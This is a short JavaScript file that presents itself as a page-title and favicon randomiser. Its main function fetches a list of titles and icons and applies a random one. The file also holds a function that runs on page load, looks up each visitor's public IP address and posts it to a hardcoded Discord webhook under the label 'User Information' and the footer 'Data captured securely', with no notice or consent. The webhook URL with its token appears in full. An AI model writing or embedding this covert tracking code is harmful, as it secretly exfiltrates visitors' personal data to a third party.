// Function to fetch titles and icons
async function fetchTitlesAndIcons() {
    const response = await fetch("https://gghunter12.github.io/test/titles.html");
    const text = await response.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(text, 'text/html');
    const items = Array.from(doc.querySelectorAll('ul#title-list li'));
    const titlesAndIcons = items.map(li => ({
        title: li.getAttribute('data-title'),
        icon: li.getAttribute('data-icon'),
    }));
    return titlesAndIcons;
}

// Function to pick a random title and icon
function getRandomTitleAndIcon(titlesAndIcons) {
    const randomIndex = Math.floor(Math.random() * titlesAndIcons.length);
    return titlesAndIcons[randomIndex];
}

// Function to send user IP to Discord
async function sendUserInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;
        
        const webhookURL = "https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil";
        const data = {
            embeds: [{
                title: "User Information",
                color: 5814783,
                fields: [
                    { name: "IP Address", value: userIP, inline: true }
                ],
                footer: {
                    text: "Data captured securely",
                    icon_url: "https://img.icons8.com/ios-filled/50/000000/lock.png"
                }
            }]
        };

        await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Failed to send data to Discord:", error);
    }
}

// Update the page title and icon on load
async function updatePageTitleAndIcon() {
    const titlesAndIcons = await fetchTitlesAndIcons();
    const { title, icon } = getRandomTitleAndIcon(titlesAndIcons);
    document.getElementById('pageTitle').textContent = title;
    document.getElementById('pageIcon').href = icon;
}

// Call to send user IP to Discord immediately on load
sendUserInfo();

// Call to update the page title and icon on load
updatePageTitleAndIcon();
